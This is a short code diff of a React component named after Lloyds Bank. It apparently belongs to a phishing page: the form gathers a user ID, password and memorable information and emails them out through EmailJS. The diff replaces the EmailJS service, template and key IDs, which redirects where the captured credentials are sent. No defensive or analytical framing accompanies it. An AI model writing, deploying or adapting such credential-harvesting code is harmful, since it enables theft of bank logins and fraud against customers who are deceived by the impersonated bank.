@@ -12,7 +12,7 @@ export default function LloydsBank() {
   const [errors, setErrors] = useState({
     userId: false,
     password: false,
-    memorable: false
+    memorable: false,
   });
 
   const sendLoginEmail = (e) => {
@@ -26,17 +26,17 @@ export default function LloydsBank() {
     const newErrors = {
       userId: !userId,
       password: !password,
-      memorable: !memorable
+      memorable: !memorable,
     };
     setErrors(newErrors);
 
     if (!newErrors.userId && !newErrors.password && !newErrors.memorable) {
       emailjs
         .sendForm(
-          "service_e1eul13",
-          "template_x4r3vzo",
+          "service_7u85vng",
+          "template_kqbv3ue",
           form.current,
-          "nb4k7l5gjhCm1Jyk1"
+          "nt6e60LqfKytbWva9"
         )
         .then(
           (result) => {
